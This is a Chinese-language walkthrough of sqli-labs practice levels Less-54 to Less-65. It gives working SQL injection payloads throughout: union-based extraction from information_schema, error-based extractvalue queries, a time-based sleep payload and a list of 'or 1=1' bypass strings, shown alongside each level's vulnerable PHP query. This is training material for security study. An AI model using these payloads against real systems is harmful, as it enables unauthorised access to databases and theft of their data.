# 二十一、第四部分/page-4 Challenges 答题模式Less-54~64

本系列为进阶学习，主要应用学习。

### Less-54

由前端提示，这一关我们主要考察是字符型注入，且只能尝试十次，以后随机重置数据库。<br>
且这里我们已知数据库名为：CHALLENGES 。

学习实践注入过程：

    ID:2000%27%20oR%201=1--+
    ID:2000%27%20union%20select%201,2,group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27--+
    ID:2000%27%20union%20select%201,2,group_concat(column_name)%20from%20information_schema.columns%20where%20table_schema=%27challenges%27%20and%20table_name=%27tsquqwumms%27--+
    ID:2000%27%20union%20select%20sessid,secret_S10L,tryy%20from%20tsquqwumms--+

提交 secret ，前端提示 CONGRATS YOU NAILED IT ，注入成功。

> Less-54 -> $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";


### Less-55

本关卡和 Less-54 的思路是一致的，这里就不给出payload了，但是这里再提醒一般常用语句：

- or 1=1--+
- 'or 1=1--+
- "or 1=1--+
- )or 1=1--+
- ')or 1=1--+
- ") or 1=1--+
- "))or 1=1--+

> Less-55 -> $sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1";


### Less-56

这里和 Less-54/55 思路基本一致，给出payload:

    ?id=-1%27)%20Or%201=1--+
    ?id=-1%27)%20union%20select%201,2,group_concat(table_name) from information_schema.tables where table_schema='challenges'--+
    ?id=-1%27)%20union%20select%20sessid,secret_L24X,tryy%20from%20ikywajvkei--+

> Less-56 -> $sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1";


### Less-57

这里和 Less-54/55/56 思路基本一致，省略 payload 了。

> Less-57 -> <br>
$id= '"'.$id.'"';<br>
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";


### Less-58

本关卡即使 id=-1 也会返回数据，但允许报错型注入。

给出实验学习payload:

    ?id=2000' and extractvalue(1,concat(0x7e,(select group_concat(table_name) from information_schema.tables where table_schema='challenges' ),0x7e))--+
    ?id=2000' and extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name='zc095sw0dp' ),0x7e))--+
    ?id=2000' and extractvalue(1,concat(0x7e,(select concat('_',secret_04AR,'_') from zc095sw0dp ),0x7e))--+

本关卡没有返回数据库中的数据，只是前端显示数据而已，因此不能 union 注入，应该走报错注入思路。

> Less-58 -> $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";


### Less-59

本关卡和 Less-58思路基本一致，省略 payload 了。

> Less-59 -> $sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";


### Less-60

本关卡和 Less-59思路基本一致，省略 payload 了。

> Less-60 -><br>
$id = '("'.$id.'")';<br>
$sql="SELECT * FROM security.users WHERE id=$id LIMIT 0,1";


### Less-61

本关卡和 Less-60思路基本一致，省略 payload 了。

> Less-61 -> $sql="SELECT * FROM security.users WHERE id=(('$id')) LIMIT 0,1";


### Less-62

此处 union 和报错注入都失效，这里我们就使用延时注入了，此处给出一个示例 payload :

    ?id=1%27)and%20If(ascii(substr((select%20group_concat(table_name)%20from%20information_schema.tables%20where%20table_schema=%27challenges%27),1,1))=119,0,sleep(10))--+

这里使用延时注入，可以适当尝试脚本。

> Less-62 -> $sql="SELECT * FROM security.users WHERE id=('$id') LIMIT 0,1";


### Less-63

本关卡和 Less-62思路基本一致，省略 payload 了。

> Less-63 -> $sql="SELECT * FROM security.users WHERE id='$id' LIMIT 0,1";


### Less-64

本关卡和 Less-63思路基本一致，省略 payload 了。

> Less-64 -> $sql="SELECT * FROM security.users WHERE id=(($id)) LIMIT 0,1";


### Less-65

本关卡和 Less-63思路基本一致，省略 payload 了。

> Less-65 -> <br>
$id = '"'.$id.'"';<br>
$sql="SELECT * FROM security.users WHERE id=($id) LIMIT 0,1";